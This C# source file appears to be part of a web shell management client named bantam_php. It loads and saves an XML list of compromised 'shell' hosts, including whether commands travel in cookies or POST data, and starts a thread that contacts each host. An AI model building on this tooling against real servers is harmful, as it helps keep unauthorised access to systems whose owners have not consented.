using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace bantam_php
{
    class XmlHelper
    {
        public static void loadShells(string xmlFile = BantamMain.CONFIG_FILE)
        {
            //check if config file exists, proceed to load it and select the "servers" into an XmlNodeList
            if (File.Exists(xmlFile))
            {
                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(xmlFile);

                XmlNodeList itemNodes = xmlDoc.SelectNodes("//servers/server");

                if (itemNodes.Count > 0)
                {
                    //loop through every server
                    foreach (XmlNode itemNode in itemNodes)
                    {
                        //TODO abstract this into process function(s)
                        //Hot select target onload up
                        string hostTarget = (itemNode.Attributes?["host"] != null) ? itemNode.Attributes?["host"].Value : "";
                        string requestArg = (itemNode.Attributes?["request_arg"] != null) ? itemNode.Attributes?["request_arg"].Value : "";
                        string requestMethod = (itemNode.Attributes?["request_method"] != null) ? itemNode.Attributes?["request_method"].Value : "";

                        //invalid hostTarget/target name
                        if (string.IsNullOrEmpty(hostTarget))
                        {
                            continue;
                        }
                        //add the hostTarget to our client class containing infos
                        BantamMain.Hosts.Add(hostTarget, new HostInfo());

                        //if the request arg is specified in the XML and not set to command
                        if (string.IsNullOrEmpty(requestArg) == false
                        && requestArg != "command")
                        {
                            BantamMain.Hosts[hostTarget].RequestArgName = requestArg;
                        }

                        //if the request method is specified in the XML and set to cookie
                        if (string.IsNullOrEmpty(requestMethod) == false
                         && requestMethod == "cookie")
                        {
                            BantamMain.Hosts[hostTarget].SendDataViaCookie = true;
                        }

                        //execute ping on current hostTarget iteration
                        Thread t = new Thread(() => Program.g_BantamMain.getInitDataThread(hostTarget));
                        t.Start();
                    }
                }
            }
            else
            {
                MessageBox.Show("Config file (" + BantamMain.CONFIG_FILE + ") is missing.", "Oh... Shied..");
            }
        }

        public static void saveShells(string configFile = BantamMain.CONFIG_FILE)
        {
            XmlDocument xmlDoc = new XmlDocument();

            XmlNode rootNode = xmlDoc.CreateElement("servers");
            xmlDoc.AppendChild(rootNode);

            foreach (KeyValuePair<String, HostInfo> host in BantamMain.Hosts)
            {
                HostInfo hostInfo = (HostInfo)host.Value;

                if (hostInfo.Down)
                {
                    continue;
                }

                XmlNode serverNode = xmlDoc.CreateElement("server");

                XmlAttribute hostAttribute = xmlDoc.CreateAttribute("host");
                hostAttribute.Value = host.Key;
                serverNode.Attributes.Append(hostAttribute);

                XmlAttribute requestArgAttribute = xmlDoc.CreateAttribute("request_arg");
                requestArgAttribute.Value = hostInfo.RequestArgName;
                serverNode.Attributes.Append(requestArgAttribute);

                XmlAttribute requestMethod = xmlDoc.CreateAttribute("request_method");
                requestMethod.Value = (hostInfo.SendDataViaCookie ? "cookie" : "post"); //todo post is not the most proper thing it could differ
                serverNode.Attributes.Append(requestMethod);

                rootNode.AppendChild(serverNode);
            }

            xmlDoc.Save(configFile);
        }
    }
}
